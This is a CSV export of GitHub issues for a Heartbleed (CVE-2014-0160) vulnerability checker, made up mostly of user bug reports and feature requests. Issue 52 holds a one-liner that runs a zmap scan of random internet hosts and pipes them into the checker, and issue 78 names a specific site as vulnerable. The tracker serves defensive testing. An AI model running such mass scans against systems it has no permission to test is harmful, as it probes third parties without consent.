FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/80,32327814,MDExOlB1bGxSZXF1ZXN0MTUyMTkyMTI=,80,Nested conditionals,5571478,closed,FALSE,NA,NA,1,2014-04-28T02:40:03Z,2014-06-15T19:06:16Z,2014-04-28T16:30:30Z,CONTRIBUTOR,NA,"Nesting check for `if err != nil`, only needs to be tested once.
",NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/80/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/80/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/80/events,https://github.com/FiloSottile/Heartbleed/pull/80,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/80
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/79,32171628,MDU6SXNzdWUzMjE3MTYyOA==,79,FiloSottile,7397836,open,FALSE,NA,NA,0,2014-04-24T18:06:23Z,2014-04-24T18:06:23Z,NA,NONE,NA,"Dear FiloSottile,

I followed your simple instructions, ""Enter a URL or a hostname to test the server for CVE-2014-0160""

after typing in the URL or Host Name and I press GO it starts because you can see the blue line at the top of the screen build, but when it gets to the end it seems like it just stops or slows to a dead stop, not quite finished but there is no activity. So I ran it a few times checking the Website (URL) that I wanted to check, but no returns, no answers, nothing? Why is this happening and Please is there another way for me to check. Please help or am I doing something wrong?

Respectfully,
Randy
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/79/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/79/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/79/events,https://github.com/FiloSottile/Heartbleed/issues/79,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/78,32022561,MDU6SXNzdWUzMjAyMjU2MQ==,78,Vulnerable site showing Safe result ..,395172,open,FALSE,NA,NA,1,2014-04-23T00:20:45Z,2014-04-23T02:14:17Z,NA,NONE,NA,"Hi there,

the website ""as.takara-standard.co.jp"" is vulnerable to heartbleed. Several online heartbleed scans are showing it vulnerable where as your GO program shows ""ERROR""
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/78/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/78/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/78/events,https://github.com/FiloSottile/Heartbleed/issues/78,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/77,31896205,MDU6SXNzdWUzMTg5NjIwNQ==,77,"Several attempts at trying to test a site, still no response",1022908,open,FALSE,NA,NA,1,2014-04-21T13:40:05Z,2014-04-23T01:41:23Z,NA,NONE,NA,"I've been trying to test https://seap.asee.org/award to see if it is susceptible. The website doesn't seem to be working however. Each time I hit go, the progress bar at the top of the screen slowly creeps to the right for a few minutes before simply stopping when it's almost done. I'll wait 5 or so minutes with no result before trying again. It's not showing any errors however, it just isn't completing the task. I tried doing it on google.com, same thing. Tried the test positive (ec2-54-81-196-192.compute-1.amazonaws.com:4433) same thing.
I'm using a school computer with Internet Explorer 9.0.8112.16421. Thanks!
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/77/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/77/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/77/events,https://github.com/FiloSottile/Heartbleed/issues/77,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/76,31855272,MDExOlB1bGxSZXF1ZXN0MTQ5NDc0OTU=,76,Add DynamoDB caching,1225294,closed,FALSE,NA,NA,0,2014-04-19T21:55:21Z,2014-06-18T02:23:47Z,2014-04-27T14:00:27Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/76/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/76/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/76/events,https://github.com/FiloSottile/Heartbleed/pull/76,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/76
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/75,31802949,MDU6SXNzdWUzMTgwMjk0OQ==,75,Unable to Install - TLS errors,1753315,closed,FALSE,NA,NA,2,2014-04-18T14:52:09Z,2014-04-18T19:06:20Z,2014-04-18T19:06:20Z,NONE,NA,"Trying to install on openSUSE 13.1
System has openssl patch, but intends to point to another, unpatched machine.
Don't know if this has anything to do with other issues, eg your code may support only TLS 1.0

If troubleshooting this issue on openSUSE is difficult, am willing to consider deploying another distro which is known to work.

Error follows
# go get github.com/FiloSottile/Heartbleed
# github.com/FiloSottile/Heartbleed/tls

go/src/github.com/FiloSottile/Heartbleed/tls/cipher_suites.go:66: undefined: cipher.AEAD
go/src/github.com/FiloSottile/Heartbleed/tls/cipher_suites.go:133: undefined: cipher.AEAD
go/src/github.com/FiloSottile/Heartbleed/tls/cipher_suites.go:146: not enough arguments to return
go/src/github.com/FiloSottile/Heartbleed/tls/cipher_suites.go:149: undefined: cipher.AEAD
go/src/github.com/FiloSottile/Heartbleed/tls/cipher_suites.go:154: undefined: cipher.NewGCM
go/src/github.com/FiloSottile/Heartbleed/tls/conn.go:255: undefined: cipher.AEAD
go/src/github.com/FiloSottile/Heartbleed/tls/conn.go:266: c.Overhead undefined (type interface {} has no field or method Overhead)
go/src/github.com/FiloSottile/Heartbleed/tls/conn.go:270: c.Open undefined (type interface {} has no field or method Open)
go/src/github.com/FiloSottile/Heartbleed/tls/conn.go:372: undefined: cipher.AEAD
go/src/github.com/FiloSottile/Heartbleed/tls/handshake_server.go:556: undefined: crypto.PublicKey
go/src/github.com/FiloSottile/Heartbleed/tls/conn.go:372: too many errors
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/75/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/75/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/75/events,https://github.com/FiloSottile/Heartbleed/issues/75,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/74,31723075,MDU6SXNzdWUzMTcyMzA3NQ==,74,dail tcp i/o timeout error,10137,open,FALSE,NA,NA,1,2014-04-17T12:37:39Z,2014-04-17T19:55:42Z,NA,NONE,NA,"Hi all,

Getting error while testing heartbleed bug ???
here is the error:
dial tcp https://xxx.xxx.xx.x i/o timeout
dial tcp https://xxx.xxx.xx.x:443 i/o timeout
dial tcp xxx.xxx.xx.x:443 i/o timeout

Tried different ways but no succeed.Please help us to resolve issue..

Thank you
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/74/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/74/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/74/events,https://github.com/FiloSottile/Heartbleed/issues/74,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/73,31575031,MDExOlB1bGxSZXF1ZXN0MTQ3ODMyMDM=,73,Break into separate tests for verbosity.,3741618,closed,FALSE,NA,NA,1,2014-04-15T17:48:38Z,2014-06-13T10:57:39Z,2014-04-17T23:32:56Z,CONTRIBUTOR,NA,"Also check for go test -short and skip the longer tests (ELB and Timeout).
",NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/73/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/73/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/73/events,https://github.com/FiloSottile/Heartbleed/pull/73,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/73
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/72,31573807,MDU6SXNzdWUzMTU3MzgwNw==,72,multiple Read calls return no data or error ,774253,open,FALSE,NA,NA,1,2014-04-15T17:32:23Z,2014-04-16T18:05:58Z,NA,NONE,NA,"I'm getting a yellow (warning?) with the message ""multiple Read calls return no data or error"" when testing on my servers. 

This error is not mentioned anywhere and I haven't seen addressed anywhere.
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/72/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/72/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/72/events,https://github.com/FiloSottile/Heartbleed/issues/72,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/71,31560317,MDU6SXNzdWUzMTU2MDMxNw==,71,Add a heartbleed detection RESTful interface for TLS clients,7303482,closed,FALSE,NA,NA,2,2014-04-15T14:55:08Z,2014-04-17T14:08:06Z,2014-04-17T14:08:06Z,NONE,NA,"It has been determined that a specially crafted TLS server can apparently make improperly sized Heartbleed requests to TLS clients, making requests for 64K of RAM from the client if it is using a vulnerable version of OpenSSL.  Most commonly used web browsers should be immune (IE uses SChannel, Firefox and Chrome use NSS, Safari probably uses Secure Transport, and Opera uses Presto).  However, there are a lot of other ""browsers"" (mostly custom solutions such as web scrapers) that are client-driven.  Clients relying on OpenSSL in the system (sometimes transparently) are still vulnerable.  It would be nice if you had a RESTful interface on a modified server that could confirm the Heartbleed status of a client if a quick script is written to point at the modified server.  This feature would mostly be for businesses looking to further shore up defenses against Heartbleed as many have internal servers running cron jobs.
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/71/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/71/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/71/events,https://github.com/FiloSottile/Heartbleed/issues/71,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/70,31449348,MDU6SXNzdWUzMTQ0OTM0OA==,70,tls: server selected unsupported protocol version 300,7288729,open,FALSE,NA,NA,1,2014-04-14T10:15:15Z,2014-04-19T11:15:39Z,NA,NONE,NA,"When testing domain brandyourself.com I get the following error:

tls: server selected unsupported protocol version 300

The site only works with TLS v1.0
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/70/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/70/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/70/events,https://github.com/FiloSottile/Heartbleed/issues/70,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/69,31406583,MDExOlB1bGxSZXF1ZXN0MTQ2OTQ2NDQ=,69,Updated FAQ for flag change,93333,closed,FALSE,NA,NA,1,2014-04-13T14:25:57Z,2014-06-13T03:45:51Z,2014-04-14T13:17:28Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/69/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/69/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/69/events,https://github.com/FiloSottile/Heartbleed/pull/69,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/69
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/68,31406358,MDExOlB1bGxSZXF1ZXN0MTQ2OTQ1NzM=,68,Add link to FAQ,93333,closed,FALSE,NA,NA,0,2014-04-13T14:16:46Z,2014-06-15T15:11:28Z,2014-04-14T13:18:01Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/68/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/68/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/68/events,https://github.com/FiloSottile/Heartbleed/pull/68,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/68
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/67,31397220,MDU6SXNzdWUzMTM5NzIyMA==,67,negative serial number?,630988,open,FALSE,NA,NA,5,2014-04-13T04:51:10Z,2014-04-30T19:21:55Z,NA,NONE,NA,"```
$ repos/heartbleed/bin/Heartbleed (a Cisco ASA)
2014/04/12 23:48:39 (my ASA) - ERROR: tls: failed to parse certificate from server: x509: negative serial number
```

Any idea what that is about?  The browser deals with it.  Chrome reports the serial as 2257982035.  It is a self-signed cert generated by the device, so I can imagine it's wrong, but I'm surprised at that.
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/67/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/67/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/67/events,https://github.com/FiloSottile/Heartbleed/issues/67,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/66,31378931,MDU6SXNzdWUzMTM3ODkzMQ==,66,False negatives ?,2655592,closed,FALSE,NA,NA,1,2014-04-12T08:22:08Z,2014-05-07T19:56:21Z,2014-05-07T19:56:21Z,NONE,NA,"Some of the worst rated ones in SSL labs test ( https://www.ssllabs.com/ssltest/ ) ,  they seem to report some sites as affected whereas given an 'All good' by this. I repeated the checks several times after clearing cache in their test.
SSL labs says 'experimental' for heartbleed test so not sure how stable the test is. 
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/66/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/66/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/66/events,https://github.com/FiloSottile/Heartbleed/issues/66,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/65,31378516,MDU6SXNzdWUzMTM3ODUxNg==,65,False positive? http://filippo.io/Heartbleed/#750words.com,20738,closed,FALSE,NA,NA,1,2014-04-12T07:48:49Z,2014-04-13T07:50:58Z,2014-04-13T07:50:58Z,NONE,NA,"750words.com seems to be a false positive. When I run it with this truty Python script: https://gist.github.com/takeshixx/10107280
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/65/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/65/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/65/events,https://github.com/FiloSottile/Heartbleed/issues/65,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/64,31375718,MDU6SXNzdWUzMTM3NTcxOA==,64,Someone has stolen your project,4987102,closed,FALSE,NA,NA,7,2014-04-12T03:53:21Z,2014-04-15T23:43:22Z,2014-04-15T23:43:22Z,NONE,NA,"Yesterday, I found that a Chinese computer company uses your project and they remove your license from the page. And they say ""We created this tool by ourselves before anyone build a tool to test CVE-2014-0160""
http://wangzhan.360.cn/heartbleed/
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/64/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/64/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/64/events,https://github.com/FiloSottile/Heartbleed/issues/64,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/63,31370530,MDU6SXNzdWUzMTM3MDUzMA==,63,Broken pipe output shows for a website which doesn't accept Heartbit,395172,open,FALSE,NA,NA,3,2014-04-11T23:40:27Z,2014-04-13T20:52:32Z,NA,NONE,NA,"Hi Fillipo,

Your program gives following output for this website.

$$ > bin/Heartbleed myprint-online.com:443
2014/04/11 23:36:42 myprint-online.com:443 - ERROR: write tcp 70.91.223.11:443: broken pipe

Whereas when i send the heartbit thru openssl it says the server cannot accept heartbit connection.

$ openssl s_client -connect myprint-online.com:443

New, TLSv1/SSLv3, Cipher is AES128-SHA
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
SSL-Session:
    Protocol  : TLSv1
    Cipher    : AES128-SHA
    Session-ID: 29090000B3F468F2377A97B3837AA15E1EB19F581C67103CDA7C764190B9ECA1
    Session-ID-ctx: 
    Master-Key: 1329CF7427D367D3D8A9DA107B0EB5696A7C635E4C2B7CE84E857BB74C72CFDB5FDC38591392F0B2E8A22455D282BD70
    Key-Arg   : None
    Krb5 Principal: None
    PSK identity: None
    PSK identity hint: None
    Start Time: 1397259160
    Timeout   : 300 (sec)
##     Verify return code: 0 (ok)

B
HEARTBEATING
139922322958152:error:1413B16D:SSL routines:SSL_F_TLS1_HEARTBEAT:peer does not accept heartbearts:t1_lib.c:2574:
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/63/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/63/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/63/events,https://github.com/FiloSottile/Heartbleed/issues/63,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/62,31309748,MDU6SXNzdWUzMTMwOTc0OA==,62,smtp does not work on office365,1051357,open,FALSE,NA,NA,4,2014-04-11T08:19:19Z,2014-04-12T06:35:18Z,NA,NONE,NA,"Heartbleed -service=smtp smtp.office365.com:587
2014/04/11 10:17:51 smtp.office365.com:587 - ERROR: Server does not support STARTTLS (503 5.5.2 Send hello first)
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/62/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/62/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/62/events,https://github.com/FiloSottile/Heartbleed/issues/62,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/61,31286236,MDU6SXNzdWUzMTI4NjIzNg==,61,Visibly link to Heartbleed from http://filippo.io ?,33569,open,FALSE,NA,NA,0,2014-04-10T22:09:12Z,2014-04-10T22:09:12Z,NA,NONE,NA,"There's a link to GitHub, but not a direct link to the testing site.
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/61/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/61/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/61/events,https://github.com/FiloSottile/Heartbleed/issues/61,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/60,31221154,MDU6SXNzdWUzMTIyMTE1NA==,60,-service or -starttls,1057824,open,FALSE,NA,NA,1,2014-04-10T07:42:23Z,2014-04-13T14:22:36Z,NA,NONE,NA,"some commens say the options is -starttls, but the script says
# ./Heartbleed -starttls imap 192.168.0.10:993

flag provided but not defined: -starttls
Usage of ./Heartbleed:
  -service=""https"": Specify a service name to test (using STARTTLS if necessary).
        Besides HTTPS, currently supported services are:
        [ftp smtp pop3 imap]
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/60/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/60/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/60/events,https://github.com/FiloSottile/Heartbleed/issues/60,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/59,31211617,MDExOlB1bGxSZXF1ZXN0MTQ1ODUzODc=,59,"shrunk heartbeat.png, from 7,271b to 3,412b",1308419,closed,FALSE,NA,NA,2,2014-04-10T02:55:20Z,2014-06-15T07:30:25Z,2014-04-10T20:22:47Z,CONTRIBUTOR,NA,"Just because you have a big heart, doesn't mean the filesize has to be big :)
",NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/59/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/59/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/59/events,https://github.com/FiloSottile/Heartbleed/pull/59,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/59
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/58,31188029,MDU6SXNzdWUzMTE4ODAyOQ==,58,Check fails on sites that return HTTP 5xx codes,948901,open,FALSE,NA,NA,0,2014-04-09T19:39:26Z,2014-04-09T19:39:26Z,NA,NONE,NA,"I tried testing a proxy server that terminates TLS/SSL but with all the backend HTTP servers down.  With a regular user-agent when connecting with HTTPS you see an HTTP 502/gateway error page.  When trying to test the proxy with the heartbleed checker, it handshakes TLS correctly with the proxy but returns this warning:

```
 Uh-oh, something went wrong: dial tcp x.x.x.x:443: i/o timeout 
```
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/58/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/58/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/58/events,https://github.com/FiloSottile/Heartbleed/issues/58,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/57,31182362,MDExOlB1bGxSZXF1ZXN0MTQ1NjY4NDE=,57,Powershell Wrapper to Check Multiple IPs on a List,7233765,open,FALSE,NA,NA,0,2014-04-09T18:28:32Z,2014-06-15T11:55:53Z,NA,NONE,NA,"In case it helps others, here is a rudimentary basic Powershell script to check a list of IP addresses 
and execute the command on each.   4-8-2012 written to run the Heartbleed.exe command to check for vulnerable SSL servers.    Assumes you installed GO programming language and Filippo's excellent Heartbleed.exe script.    This was tested to work on Windows 7, 64 bit.  List of IPs contains  x.x.x.x:port  separated by newline character (ex:  65.233.11.4:8443)
",NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/57/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/57/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/57/events,https://github.com/FiloSottile/Heartbleed/pull/57,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/57
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/56,31181772,MDU6SXNzdWUzMTE4MTc3Mg==,56,Interpreting the output,7233765,open,FALSE,NA,NA,0,2014-04-09T18:20:58Z,2014-04-09T18:33:00Z,NA,NONE,NA,"Hi there Filippo, first of all thank you so much for writing this handy tool.  I've installed it at work and am running it off my windows machine using a powershell script to check internal hosts (as well as our external hosts).   I will post the powershell wrapper here shortly although I am not  a ""coder"" it is extremely simple and just a wrapper to run your script.

I had a question about interpreting the output of your Heartbleed script, for example I am getting these results (among the detected VULNERABLE and CLEANs):

   1) 2014/04/09 11:17:47 10.48.101.36:443 - ERROR: tls: failed to parse certificate from server: x509: negative serial number

   2) 2014/04/09 11:14:42 10.50.1.1:443 - ERROR: tls: server selected unsupported protocol version 300

   3)  2014/04/09 11:31:28 10.32.42.105:443 - ERROR: remote error: bad record MAC

Do you have a list of possible outcomes to understand whether that means those IP addresses should be tested further or any other way to interprest this output.  Thanks.
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/56/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/56/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/56/events,https://github.com/FiloSottile/Heartbleed/issues/56,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/55,31167644,MDU6SXNzdWUzMTE2NzY0NA==,55,Display issue date of SSL certificate on server,57939,open,FALSE,NA,NA,2,2014-04-09T15:32:03Z,2014-04-11T07:38:07Z,NA,NONE,NA,"Should help identify sites which have updated OpenSSL but not created a new certificate.
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/55/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/55/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/55/events,https://github.com/FiloSottile/Heartbleed/issues/55,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/54,31165723,MDExOlB1bGxSZXF1ZXN0MTQ1NTY1NTQ=,54,Exposes overflow size as a flag variable.,739690,closed,FALSE,NA,NA,2,2014-04-09T15:12:07Z,2014-06-12T18:06:38Z,2014-04-10T11:13:11Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/54/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/54/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/54/events,https://github.com/FiloSottile/Heartbleed/pull/54,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/54
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/53,31158150,MDU6SXNzdWUzMTE1ODE1MA==,53,full ulrs hanig,119819,closed,FALSE,NA,NA,3,2014-04-09T13:47:02Z,2014-04-09T16:43:36Z,2014-04-09T15:09:29Z,NONE,NA,"when one enters https://foo.bar.com into the field it hangs.
a validator that strips that info should be implmented
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/53/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/53/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/53/events,https://github.com/FiloSottile/Heartbleed/issues/53,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/52,31158032,MDU6SXNzdWUzMTE1ODAzMg==,52,Output all results to stdout,78341,closed,FALSE,NA,NA,1,2014-04-09T13:45:18Z,2018-07-04T07:56:27Z,2018-07-04T07:56:27Z,CONTRIBUTOR,NA,"Please send all scan results of the command line tool to stdout. This makes processing mass scan results, i.e. with xargs, much simpler. The following example should only output VULNERABLE lines:

  $ sudo zmap -p 443 -n 1000 -o- -q | xargs -n 1 docker run kasimon/heartbleed | grep VULNERABLE 
  Apr 09 15:42:24.601 [INFO] zmap: output module: csv
  Apr 09 15:42:32.836 [INFO] zmap: completed
2014/04/09 13:42:33 <ip removed> - ERROR: tls: oversized record received with length 20291
2014/04/09 13:42:33 <ip removed> - ERROR: EOF
2014/04/09 13:42:37 ([]uint8) {
 00000000  02 00 79 68 65 61 72 74  62 6c 65 65 64 2e 66 69  |..yheartbleed.fi|
 00000010  6c 69 70 70 6f 2e 69 6f  59 45 4c 4c 4f 57 20 53  |lippo.ioYELLOW S|
 00000020  55 42 4d 41 52 49 4e 45  d9 a0 da a3 ed 4f 60 e8  |UBMARINE.....O`.|
 00000030  88 0a 89 3c f9 08 3a 8b  18 5e 11 5c 31 f6 ba fb  |...<..:..^.\1...|
 00000040  ed f9 bb 41 46 a5 3c 72  19 79 b1 61 12 59 5b c3  |...AF.<r.y.a.Y[.|
 00000050  7b 8d c0 40 d5 d2 6e 06  a7 64 6a 0d e7 8a 26 b2  |{..@..n..dj...&.|
 00000060  d6 3a 6f 4b 22 a1 b9 dc  5d ae 85 a8 04 31 22 06  |.:oK""...]....1"".|
 00000070  1f 71 28 44 dc ef 7a 92  9b 3d cb 7b 57 f9 16 de  |.q(D..z..=.{W...|
 00000080  29 78 7c 9f d0 d1 da 91  37 cf ef cb              |)x|.....7...|
}

2014/04/09 13:42:37 <ip removed> - VULNERABLE

Thanks!
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/52/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/52/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/52/events,https://github.com/FiloSottile/Heartbleed/issues/52,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/51,31154343,MDU6SXNzdWUzMTE1NDM0Mw==,51,timeouts on Heroku and ELB (AWS)?,17994,closed,FALSE,NA,NA,1,2014-04-09T12:54:09Z,2014-04-09T13:11:20Z,2014-04-09T13:11:20Z,NONE,NA,"seems like all the hosts I test on either Heroku and/or AWS ELB timeout always?

I know they have both been patched, but... wondering why they timeout?
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/51/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/51/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/51/events,https://github.com/FiloSottile/Heartbleed/issues/51,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/50,31150682,MDU6SXNzdWUzMTE1MDY4Mg==,50,What does ERROR: heartbleed: timeout mean?,647137,closed,FALSE,NA,NA,4,2014-04-09T11:56:56Z,2014-04-09T12:40:42Z,2014-04-09T12:17:58Z,NONE,NA,"On a website I get:

```
ERROR: heartbleed: timeout
```

What does this mean?
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/50/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/50/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/50/events,https://github.com/FiloSottile/Heartbleed/issues/50,NA
